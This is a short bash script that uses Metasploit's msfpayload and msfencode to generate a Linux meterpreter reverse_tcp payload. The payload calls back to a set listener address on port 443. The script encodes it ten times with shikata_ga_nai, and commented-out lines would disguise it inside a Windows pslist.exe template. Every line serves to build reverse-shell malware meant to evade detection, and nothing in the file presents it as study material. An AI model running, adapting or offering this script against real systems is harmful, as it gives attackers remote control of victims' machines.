     #!/bin/bash

PAYLOAD_SHORT=met_rev
PAYLOAD=linux/x86/meterpreter/reverse_tcp
LHOST=192.168.227.1
LPORT=443
ENCODER_SHORT=shikata
ENCODER=x86/shikata_ga_nai
#TEMPLATE_SHORT=pslist
#TEMPLATE=/pentest/windows-binaries/pstools/pslist.exe
TYPE=elf

./msfpayload $PAYLOAD LHOST=$LHOST,LPORT=$LPORT R | ./msfencode -c 10 -e $ENCODER -o ${PAYLOAD_SHORT}_${ENCODER_SHORT}_${LHOST}_${LPORT}.${TYPE} -t $TYPE
# -x $TEMPLATE
